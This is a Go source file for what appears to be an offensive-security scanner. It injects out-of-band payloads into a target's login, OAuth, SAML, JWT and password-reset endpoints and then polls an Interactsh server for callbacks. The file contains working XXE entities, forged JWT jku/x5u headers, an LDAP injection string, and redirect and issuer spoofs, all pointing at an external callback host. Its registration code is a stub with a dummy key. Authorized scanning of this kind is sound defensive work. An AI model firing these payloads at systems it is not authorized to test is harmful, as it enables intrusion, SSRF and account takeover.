package oob

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/CodeMonkeyCybersecurity/shells/internal/core"
	"github.com/CodeMonkeyCybersecurity/shells/pkg/types"
)

// OOBConfig represents configuration for out-of-band testing
type OOBConfig struct {
	PollDuration         time.Duration
	CollaboratorDuration time.Duration
	ServerURL            string // Custom Interactsh server URL
	AuthToken            string // Optional auth token for private servers
}

// InteractshClient handles communication with Interactsh server
type InteractshClient struct {
	serverURL     string
	authToken     string
	sessionToken  string
	correlationID string
	secretKey     string
	pubKey        string
	privKey       string
	registered    bool
	mu            sync.RWMutex
}

// InteractshInteraction represents an OOB interaction
type InteractshInteraction struct {
	Protocol      string    `json:"protocol"`
	UniqueID      string    `json:"unique-id"`
	FullID        string    `json:"full-id"`
	QType         string    `json:"q-type,omitempty"`
	RawRequest    string    `json:"raw-request"`
	RawResponse   string    `json:"raw-response"`
	RemoteAddress string    `json:"remote-address"`
	Timestamp     time.Time `json:"timestamp"`
}

// RegistrationRequest for Interactsh
type RegistrationRequest struct {
	PublicKey     string `json:"public-key"`
	SecretKey     string `json:"secret-key"`
	CorrelationID string `json:"correlation-id"`
}

// RegistrationResponse from Interactsh
type RegistrationResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Error   string `json:"error,omitempty"`
}

// PollResponse from Interactsh
type PollResponse struct {
	Data   []InteractshInteraction `json:"data"`
	Error  string                  `json:"error,omitempty"`
	AesKey string                  `json:"aes_key,omitempty"`
}

// interactshScanner implements OOB testing with identity validation focus
type interactshScanner struct {
	config OOBConfig
	logger interface {
		Info(msg string, keysAndValues ...interface{})
		Error(msg string, keysAndValues ...interface{})
		Debug(msg string, keysAndValues ...interface{})
	}
	client *InteractshClient
}

// NewInteractshScanner creates a new OOB scanner with identity validation capabilities
func NewInteractshScanner(config OOBConfig, logger interface {
	Info(msg string, keysAndValues ...interface{})
	Error(msg string, keysAndValues ...interface{})
	Debug(msg string, keysAndValues ...interface{})
}) (core.Scanner, error) {
	if config.ServerURL == "" {
		config.ServerURL = "https://oast.fun" // Default public server
	}
	if config.PollDuration == 0 {
		config.PollDuration = 60 * time.Second
	}
	if config.CollaboratorDuration == 0 {
		config.CollaboratorDuration = 5 * time.Minute
	}

	client := &InteractshClient{
		serverURL: config.ServerURL,
		authToken: config.AuthToken,
	}

	return &interactshScanner{
		config: config,
		logger: logger,
		client: client,
	}, nil
}

func (s *interactshScanner) Name() string {
	return "interactsh"
}

func (s *interactshScanner) Type() types.ScanType {
	return types.ScanType("oob")
}

func (s *interactshScanner) Validate(target string) error {
	if target == "" {
		return fmt.Errorf("target cannot be empty")
	}

	// Validate URL format
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		return fmt.Errorf("target must be a valid HTTP/HTTPS URL")
	}

	return nil
}

func (s *interactshScanner) Scan(ctx context.Context, target string, options map[string]string) ([]types.Finding, error) {
	s.logger.Info("Starting OOB identity validation scan", "target", target)

	// Register with Interactsh server
	if err := s.client.Register(ctx); err != nil {
		return nil, fmt.Errorf("failed to register with Interactsh: %w", err)
	}
	defer s.client.Deregister(ctx)

	// Generate unique payloads for different identity validation tests
	payloads := s.generateIdentityPayloads()

	// Inject payloads into various identity-related endpoints
	injectionPoints := s.injectPayloads(ctx, target, payloads)

	// Start monitoring for interactions
	interactions := make(chan InteractshInteraction, 100)
	pollCtx, cancel := context.WithTimeout(ctx, s.config.PollDuration)
	defer cancel()

	go s.client.Poll(pollCtx, interactions)

	// Collect and analyze interactions
	var findings []types.Finding
	interactionMap := make(map[string][]InteractshInteraction)

	for interaction := range interactions {
		// Group interactions by payload ID
		for payloadID := range payloads {
			if strings.Contains(interaction.FullID, payloadID) {
				interactionMap[payloadID] = append(interactionMap[payloadID], interaction)
				break
			}
		}
	}

	// Analyze interactions for identity-related vulnerabilities
	for payloadID, payload := range payloads {
		if interactions, found := interactionMap[payloadID]; found {
			if finding := s.analyzeIdentityInteraction(payload, interactions, injectionPoints[payloadID]); finding != nil {
				findings = append(findings, *finding)
			}
		}
	}

	s.logger.Info("OOB identity validation scan completed",
		"target", target,
		"findings", len(findings))

	return findings, nil
}

// generateIdentityPayloads creates payloads for identity validation testing
func (s *interactshScanner) generateIdentityPayloads() map[string]IdentityPayload {
	subdomain := s.client.GetSubdomain()
	payloads := make(map[string]IdentityPayload)

	// Generate unique IDs for each test type
	testTypes := []string{
		"saml-xxe",
		"oauth-redirect",
		"jwt-jku",
		"jwt-x5u",
		"ldap-injection",
		"password-reset",
		"webhook-ssrf",
		"oidc-issuer",
		"xml-external-entity",
		"user-enumeration",
	}

	for _, testType := range testTypes {
		payloadID := generateRandomID(8)
		payload := IdentityPayload{
			ID:        payloadID,
			Type:      testType,
			Subdomain: fmt.Sprintf("%s-%s", payloadID, subdomain),
		}

		// Generate specific payloads based on test type
		switch testType {
		case "saml-xxe":
			payload.Content = s.generateSAMLXXEPayload(payload.Subdomain)
		case "oauth-redirect":
			payload.Content = s.generateOAuthRedirectPayload(payload.Subdomain)
		case "jwt-jku":
			payload.Content = s.generateJWTJKUPayload(payload.Subdomain)
		case "jwt-x5u":
			payload.Content = s.generateJWTX5UPayload(payload.Subdomain)
		case "ldap-injection":
			payload.Content = s.generateLDAPPayload(payload.Subdomain)
		case "password-reset":
			payload.Content = s.generatePasswordResetPayload(payload.Subdomain)
		case "webhook-ssrf":
			payload.Content = s.generateWebhookPayload(payload.Subdomain)
		case "oidc-issuer":
			payload.Content = s.generateOIDCIssuerPayload(payload.Subdomain)
		case "xml-external-entity":
			payload.Content = s.generateXMLExternalEntityPayload(payload.Subdomain)
		case "user-enumeration":
			payload.Content = s.generateUserEnumerationPayload(payload.Subdomain)
		}

		payloads[payloadID] = payload
	}

	return payloads
}

// IdentityPayload represents an OOB payload for identity testing
type IdentityPayload struct {
	ID        string
	Type      string
	Subdomain string
	Content   string
}

// InjectionPoint tracks where a payload was injected
type InjectionPoint struct {
	URL      string
	Method   string
	Location string // header, body, query, etc.
	Field    string // specific field name
}

// injectPayloads injects OOB payloads into identity-related endpoints
func (s *interactshScanner) injectPayloads(ctx context.Context, target string, payloads map[string]IdentityPayload) map[string][]InjectionPoint {
	injectionPoints := make(map[string][]InjectionPoint)

	// Discover identity endpoints
	endpoints := s.discoverIdentityEndpoints(ctx, target)

	for payloadID, payload := range payloads {
		var points []InjectionPoint

		// Inject based on payload type
		switch payload.Type {
		case "saml-xxe":
			points = s.injectSAMLPayload(ctx, endpoints, payload)
		case "oauth-redirect":
			points = s.injectOAuthPayload(ctx, endpoints, payload)
		case "jwt-jku", "jwt-x5u":
			points = s.injectJWTPayload(ctx, endpoints, payload)
		case "ldap-injection":
			points = s.injectLDAPPayload(ctx, endpoints, payload)
		case "password-reset":
			points = s.injectPasswordResetPayload(ctx, endpoints, payload)
		case "webhook-ssrf":
			points = s.injectWebhookPayload(ctx, endpoints, payload)
		case "oidc-issuer":
			points = s.injectOIDCPayload(ctx, endpoints, payload)
		case "xml-external-entity":
			points = s.injectXMLPayload(ctx, endpoints, payload)
		case "user-enumeration":
			points = s.injectUserEnumerationPayload(ctx, endpoints, payload)
		}

		injectionPoints[payloadID] = points
	}

	return injectionPoints
}

// discoverIdentityEndpoints finds identity-related endpoints
func (s *interactshScanner) discoverIdentityEndpoints(ctx context.Context, target string) []string {
	endpoints := []string{}

	// Common identity endpoints
	commonPaths := []string{
		"/login",
		"/signin",
		"/auth",
		"/authenticate",
		"/saml/login",
		"/saml/acs",
		"/oauth/authorize",
		"/oauth/token",
		"/oauth/callback",
		"/oidc/auth",
		"/oidc/token",
		"/api/auth",
		"/api/login",
		"/api/users",
		"/password/reset",
		"/forgot-password",
		"/register",
		"/signup",
		"/account",
		"/profile",
		"/jwt/verify",
		"/sso/login",
		"/federation",
		"/.well-known/openid-configuration",
		"/adfs/ls",
		"/adfs/oauth2",
	}

	baseURL, _ := url.Parse(target)
	for _, path := range commonPaths {
		endpoint := baseURL.String() + path
		// Check if endpoint exists
		if s.checkEndpoint(ctx, endpoint) {
			endpoints = append(endpoints, endpoint)
		}
	}

	return endpoints
}

// checkEndpoint verifies if an endpoint exists
func (s *interactshScanner) checkEndpoint(ctx context.Context, endpoint string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", endpoint, nil)
	if err != nil {
		return false
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Consider 200, 401, 403, 302 as existing endpoints
	return resp.StatusCode == 200 || resp.StatusCode == 401 ||
		resp.StatusCode == 403 || resp.StatusCode == 302
}

// analyzeIdentityInteraction analyzes OOB interactions for identity vulnerabilities
func (s *interactshScanner) analyzeIdentityInteraction(payload IdentityPayload, interactions []InteractshInteraction, injectionPoints []InjectionPoint) *types.Finding {
	if len(interactions) == 0 {
		return nil
	}

	// Build evidence from interactions
	var evidence strings.Builder
	evidence.WriteString(fmt.Sprintf("Out-of-band interaction detected for %s test\n\n", payload.Type))

	for i, interaction := range interactions {
		evidence.WriteString(fmt.Sprintf("Interaction %d:\n", i+1))
		evidence.WriteString(fmt.Sprintf("- Protocol: %s\n", interaction.Protocol))
		evidence.WriteString(fmt.Sprintf("- Remote Address: %s\n", interaction.RemoteAddress))
		evidence.WriteString(fmt.Sprintf("- Timestamp: %s\n", interaction.Timestamp.Format(time.RFC3339)))
		if interaction.RawRequest != "" {
			evidence.WriteString(fmt.Sprintf("- Request Preview: %s\n", truncateString(interaction.RawRequest, 200)))
		}
		evidence.WriteString("\n")
	}

	evidence.WriteString("Injection Points:\n")
	for _, point := range injectionPoints {
		evidence.WriteString(fmt.Sprintf("- %s %s (Location: %s, Field: %s)\n",
			point.Method, point.URL, point.Location, point.Field))
	}

	// Determine severity and create finding
	severity := s.determineSeverity(payload.Type, interactions)
	title := s.generateTitle(payload.Type)
	description := s.generateDescription(payload.Type, interactions)
	remediation := s.generateRemediation(payload.Type)

	finding := &types.Finding{
		ID:          fmt.Sprintf("oob_%s_%s", payload.Type, payload.ID),
		Type:        "OOB_IDENTITY_VALIDATION",
		Title:       title,
		Description: description,
		Severity:    severity,
		Evidence:    evidence.String(),
		Solution:    remediation,
		References:  s.getReferences(payload.Type),
		Metadata: map[string]interface{}{
			"target":            injectionPoints[0].URL,
			"tags":              []string{"oob", "identity", payload.Type},
			"payload_type":      payload.Type,
			"interaction_count": len(interactions),
			"injection_points":  len(injectionPoints),
			"subdomain":         payload.Subdomain,
		},
	}

	return finding
}

// Helper functions for payload generation
func (s *interactshScanner) generateSAMLXXEPayload(subdomain string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://%s/xxe">
]>
<samlp:AuthnRequest>
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:AuthnRequest>`, subdomain)
}

func (s *interactshScanner) generateOAuthRedirectPayload(subdomain string) string {
	return fmt.Sprintf("http://%s/oauth-callback", subdomain)
}

func (s *interactshScanner) generateJWTJKUPayload(subdomain string) string {
	return fmt.Sprintf(`{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "http://%s/jwks.json"
}`, subdomain)
}

func (s *interactshScanner) generateJWTX5UPayload(subdomain string) string {
	return fmt.Sprintf(`{
  "alg": "RS256",
  "typ": "JWT",
  "x5u": "http://%s/cert.pem"
}`, subdomain)
}

func (s *interactshScanner) generateLDAPPayload(subdomain string) string {
	return fmt.Sprintf("*)(mail=*@%s", subdomain)
}

func (s *interactshScanner) generatePasswordResetPayload(subdomain string) string {
	return fmt.Sprintf("test@%s", subdomain)
}

func (s *interactshScanner) generateWebhookPayload(subdomain string) string {
	return fmt.Sprintf("http://%s/webhook", subdomain)
}

func (s *interactshScanner) generateOIDCIssuerPayload(subdomain string) string {
	return fmt.Sprintf("http://%s/.well-known/openid-configuration", subdomain)
}

func (s *interactshScanner) generateXMLExternalEntityPayload(subdomain string) string {
	return fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY ext SYSTEM "http://%s/xxe">]><user>&ext;</user>`, subdomain)
}

func (s *interactshScanner) generateUserEnumerationPayload(subdomain string) string {
	return fmt.Sprintf("admin@%s", subdomain)
}

// Helper functions for severity determination
func (s *interactshScanner) determineSeverity(payloadType string, interactions []InteractshInteraction) types.Severity {
	// Critical vulnerabilities
	criticalTypes := []string{"saml-xxe", "jwt-jku", "jwt-x5u", "xml-external-entity"}
	for _, t := range criticalTypes {
		if payloadType == t {
			return types.SeverityCritical
		}
	}

	// High severity
	highTypes := []string{"oauth-redirect", "ldap-injection", "oidc-issuer"}
	for _, t := range highTypes {
		if payloadType == t {
			return types.SeverityHigh
		}
	}

	// Medium severity
	mediumTypes := []string{"password-reset", "webhook-ssrf"}
	for _, t := range mediumTypes {
		if payloadType == t {
			return types.SeverityMedium
		}
	}

	return types.SeverityLow
}

// Helper functions for generating finding details
func (s *interactshScanner) generateTitle(payloadType string) string {
	titles := map[string]string{
		"saml-xxe":            "SAML XXE via Out-of-Band Interaction",
		"oauth-redirect":      "OAuth Open Redirect with OOB Validation",
		"jwt-jku":             "JWT JKU Header Injection",
		"jwt-x5u":             "JWT X5U Header Injection",
		"ldap-injection":      "LDAP Injection via OOB DNS",
		"password-reset":      "Password Reset Token Leakage",
		"webhook-ssrf":        "Webhook SSRF Vulnerability",
		"oidc-issuer":         "OIDC Issuer Spoofing",
		"xml-external-entity": "XML External Entity Injection",
		"user-enumeration":    "User Enumeration via Email Check",
	}

	if title, ok := titles[payloadType]; ok {
		return title
	}
	return "Unknown OOB Identity Vulnerability"
}

func (s *interactshScanner) generateDescription(payloadType string, interactions []InteractshInteraction) string {
	descriptions := map[string]string{
		"saml-xxe":            "The SAML endpoint is vulnerable to XML External Entity (XXE) injection. An attacker can exfiltrate sensitive data or perform SSRF attacks through malicious SAML assertions.",
		"oauth-redirect":      "The OAuth implementation accepts arbitrary redirect URIs, allowing attackers to steal authorization codes and access tokens.",
		"jwt-jku":             "The JWT validation accepts arbitrary JKU (JSON Web Key Set URL) headers, allowing attackers to specify their own public keys for token validation.",
		"jwt-x5u":             "The JWT validation accepts arbitrary X5U (X.509 Certificate URL) headers, enabling signature bypass attacks.",
		"ldap-injection":      "LDAP queries are constructed using untrusted input, allowing attackers to modify query logic and potentially extract sensitive information.",
		"password-reset":      "Password reset tokens or notifications can be sent to attacker-controlled email addresses, enabling account takeover.",
		"webhook-ssrf":        "The webhook functionality can be abused to perform Server-Side Request Forgery (SSRF) attacks against internal resources.",
		"oidc-issuer":         "The OIDC implementation accepts tokens from arbitrary issuers, potentially allowing authentication bypass.",
		"xml-external-entity": "XML parsing is vulnerable to external entity injection, allowing file disclosure and SSRF attacks.",
		"user-enumeration":    "The application leaks information about valid usernames through differential responses or timing.",
	}

	base := descriptions[payloadType]
	if base != "" {
		return fmt.Sprintf("%s The application made %d out-of-band connection(s) to the attacker-controlled server, confirming the vulnerability.", base, len(interactions))
	}
	return "An out-of-band interaction was detected, indicating a potential security vulnerability."
}

func (s *interactshScanner) generateRemediation(payloadType string) string {
	remediations := map[string]string{
		"saml-xxe":            "Disable XML external entity processing in all XML parsers. Use defusedxml or similar libraries. Validate and sanitize all SAML assertions.",
		"oauth-redirect":      "Implement strict redirect URI validation using an allowlist. Require exact matching of redirect URIs. Use the state parameter for CSRF protection.",
		"jwt-jku":             "Never trust JKU headers from untrusted sources. Use a predefined set of trusted key sources. Implement proper key pinning.",
		"jwt-x5u":             "Disable X5U header processing or restrict it to a whitelist of trusted certificate URLs. Validate certificate chains properly.",
		"ldap-injection":      "Use parameterized LDAP queries. Escape special LDAP characters. Implement proper input validation and sanitization.",
		"password-reset":      "Validate email ownership before sending reset tokens. Use secure random tokens. Implement rate limiting on password reset requests.",
		"webhook-ssrf":        "Validate and restrict webhook URLs to external domains only. Implement URL parsing and validation. Block requests to internal IP ranges.",
		"oidc-issuer":         "Validate token issuers against a whitelist. Implement proper issuer verification. Use discovery documents from trusted sources only.",
		"xml-external-entity": "Disable DTD processing entirely. Use secure XML parser configurations. Validate and sanitize all XML input.",
		"user-enumeration":    "Implement consistent error messages and response times. Use generic error messages. Add CAPTCHAs to prevent automated enumeration.",
	}

	if remediation, ok := remediations[payloadType]; ok {
		return remediation
	}
	return "Implement proper input validation and secure coding practices."
}

func (s *interactshScanner) getReferences(payloadType string) []string {
	baseRefs := []string{
		"https://portswigger.net/web-security/xxe",
		"https://owasp.org/www-project-web-security-testing-guide/",
	}

	specificRefs := map[string][]string{
		"saml-xxe": {
			"https://web-in-security.blogspot.com/2014/11/detecting-and-exploiting-xxe-in-saml.html",
			"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
		},
		"oauth-redirect": {
			"https://portswigger.net/web-security/oauth",
			"https://datatracker.ietf.org/doc/html/rfc6749#section-10.6",
		},
		"jwt-jku": {
			"https://portswigger.net/web-security/jwt",
			"https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2",
		},
		"jwt-x5u": {
			"https://portswigger.net/web-security/jwt",
			"https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.5",
		},
	}

	if refs, ok := specificRefs[payloadType]; ok {
		return append(baseRefs, refs...)
	}
	return baseRefs
}

// InteractshClient implementation methods

// Register registers with the Interactsh server
func (c *InteractshClient) Register(ctx context.Context) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	if c.registered {
		return nil
	}

	// Generate correlation ID and keys
	c.correlationID = generateRandomID(20)
	c.secretKey = generateRandomID(32)

	// For now, use simple registration (in production, implement proper crypto)
	req := RegistrationRequest{
		PublicKey:     "dummy-public-key",
		SecretKey:     c.secretKey,
		CorrelationID: c.correlationID,
	}

	data, err := json.Marshal(req)
	if err != nil {
		return err
	}

	regURL := fmt.Sprintf("%s/register", c.serverURL)
	httpReq, err := http.NewRequestWithContext(ctx, "POST", regURL, bytes.NewReader(data))
	if err != nil {
		return err
	}
	httpReq.Header.Set("Content-Type", "application/json")

	if c.authToken != "" {
		httpReq.Header.Set("Authorization", "Bearer "+c.authToken)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var regResp RegistrationResponse
	if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
		return err
	}

	if !regResp.Success {
		return fmt.Errorf("registration failed: %s", regResp.Error)
	}

	c.registered = true
	return nil
}

// Deregister deregisters from the Interactsh server
func (c *InteractshClient) Deregister(ctx context.Context) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	if !c.registered {
		return nil
	}

	// Send deregistration request
	deregURL := fmt.Sprintf("%s/deregister", c.serverURL)
	req, err := http.NewRequestWithContext(ctx, "POST", deregURL,
		strings.NewReader(fmt.Sprintf(`{"correlation-id":"%s","secret":"%s"}`, c.correlationID, c.secretKey)))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	if c.authToken != "" {
		req.Header.Set("Authorization", "Bearer "+c.authToken)
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	c.registered = false
	return nil
}

// GetSubdomain returns the registered subdomain
func (c *InteractshClient) GetSubdomain() string {
	c.mu.RLock()
	defer c.mu.RUnlock()

	if c.correlationID != "" {
		// Extract domain from server URL
		u, _ := url.Parse(c.serverURL)
		host := u.Host
		if strings.Contains(host, ":") {
			host = strings.Split(host, ":")[0]
		}
		return fmt.Sprintf("%s.%s", c.correlationID, host)
	}
	return ""
}

// Poll polls for interactions
func (c *InteractshClient) Poll(ctx context.Context, interactions chan<- InteractshInteraction) error {
	defer close(interactions)

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-ticker.C:
			pollURL := fmt.Sprintf("%s/poll?id=%s&secret=%s", c.serverURL, c.correlationID, c.secretKey)

			req, err := http.NewRequestWithContext(ctx, "GET", pollURL, nil)
			if err != nil {
				continue
			}

			if c.authToken != "" {
				req.Header.Set("Authorization", "Bearer "+c.authToken)
			}

			client := &http.Client{Timeout: 10 * time.Second}
			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			var pollResp PollResponse
			if err := json.NewDecoder(resp.Body).Decode(&pollResp); err != nil {
				resp.Body.Close()
				continue
			}
			resp.Body.Close()

			for _, interaction := range pollResp.Data {
				select {
				case interactions <- interaction:
				case <-ctx.Done():
					return ctx.Err()
				}
			}
		}
	}
}

// Injection helper methods

func (s *interactshScanner) injectSAMLPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "saml") {
			// Inject into SAML assertion
			req, _ := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(payload.Content))
			req.Header.Set("Content-Type", "application/xml")

			client := &http.Client{Timeout: 5 * time.Second}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "POST",
				Location: "body",
				Field:    "SAMLRequest",
			})
		}
	}

	return points
}

func (s *interactshScanner) injectOAuthPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "oauth") || strings.Contains(endpoint, "authorize") {
			// Inject as redirect_uri
			u, _ := url.Parse(endpoint)
			q := u.Query()
			q.Set("redirect_uri", payload.Content)
			q.Set("response_type", "code")
			q.Set("client_id", "test-client")
			u.RawQuery = q.Encode()

			req, _ := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
			client := &http.Client{
				Timeout: 5 * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "GET",
				Location: "query",
				Field:    "redirect_uri",
			})
		}
	}

	return points
}

func (s *interactshScanner) injectJWTPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	// Create a malformed JWT with malicious jku/x5u
	header := base64URLEncode([]byte(payload.Content))
	payloadData := base64URLEncode([]byte(`{"sub":"test","iat":1234567890}`))
	signature := base64URLEncode([]byte("fake-signature"))
	maliciousJWT := fmt.Sprintf("%s.%s.%s", header, payloadData, signature)

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "api") || strings.Contains(endpoint, "auth") {
			// Inject as Authorization header
			req, _ := http.NewRequestWithContext(ctx, "GET", endpoint, nil)
			req.Header.Set("Authorization", "Bearer "+maliciousJWT)

			client := &http.Client{Timeout: 5 * time.Second}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "GET",
				Location: "header",
				Field:    "Authorization",
			})
		}
	}

	return points
}

func (s *interactshScanner) injectLDAPPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "login") || strings.Contains(endpoint, "auth") {
			// Inject into username field
			formData := url.Values{
				"username": {payload.Content},
				"password": {"password123"},
			}

			req, _ := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(formData.Encode()))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			client := &http.Client{Timeout: 5 * time.Second}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "POST",
				Location: "body",
				Field:    "username",
			})
		}
	}

	return points
}

func (s *interactshScanner) injectPasswordResetPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "password") || strings.Contains(endpoint, "forgot") {
			// Inject as email parameter
			formData := url.Values{
				"email": {payload.Content},
			}

			req, _ := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(formData.Encode()))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			client := &http.Client{Timeout: 5 * time.Second}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "POST",
				Location: "body",
				Field:    "email",
			})
		}
	}

	return points
}

func (s *interactshScanner) injectWebhookPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "account") || strings.Contains(endpoint, "profile") {
			// Try to update webhook URL in profile
			jsonData := fmt.Sprintf(`{"webhook_url":"%s"}`, payload.Content)

			req, _ := http.NewRequestWithContext(ctx, "PUT", endpoint, strings.NewReader(jsonData))
			req.Header.Set("Content-Type", "application/json")

			client := &http.Client{Timeout: 5 * time.Second}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "PUT",
				Location: "body",
				Field:    "webhook_url",
			})
		}
	}

	return points
}

func (s *interactshScanner) injectOIDCPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "oidc") || strings.Contains(endpoint, "openid") {
			// Inject as issuer parameter
			u, _ := url.Parse(endpoint)
			q := u.Query()
			q.Set("iss", payload.Content)
			u.RawQuery = q.Encode()

			req, _ := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
			client := &http.Client{Timeout: 5 * time.Second}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "GET",
				Location: "query",
				Field:    "iss",
			})
		}
	}

	return points
}

func (s *interactshScanner) injectXMLPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "api") {
			// Try XML content type
			req, _ := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(payload.Content))
			req.Header.Set("Content-Type", "application/xml")

			client := &http.Client{Timeout: 5 * time.Second}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "POST",
				Location: "body",
				Field:    "xml",
			})
		}
	}

	return points
}

func (s *interactshScanner) injectUserEnumerationPayload(ctx context.Context, endpoints []string, payload IdentityPayload) []InjectionPoint {
	var points []InjectionPoint

	for _, endpoint := range endpoints {
		if strings.Contains(endpoint, "register") || strings.Contains(endpoint, "signup") {
			// Check if email exists
			formData := url.Values{
				"email":      {payload.Content},
				"check_only": {"true"},
			}

			req, _ := http.NewRequestWithContext(ctx, "POST", endpoint, strings.NewReader(formData.Encode()))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			client := &http.Client{Timeout: 5 * time.Second}
			client.Do(req)

			points = append(points, InjectionPoint{
				URL:      endpoint,
				Method:   "POST",
				Location: "body",
				Field:    "email",
			})
		}
	}

	return points
}

// Utility functions

func generateRandomID(length int) string {
	b := make([]byte, length)
	rand.Read(b)
	return hex.EncodeToString(b)[:length]
}

func base64URLEncode(data []byte) string {
	encoded := make([]byte, base64.RawURLEncoding.EncodedLen(len(data)))
	base64.RawURLEncoding.Encode(encoded, data)
	return string(encoded)
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
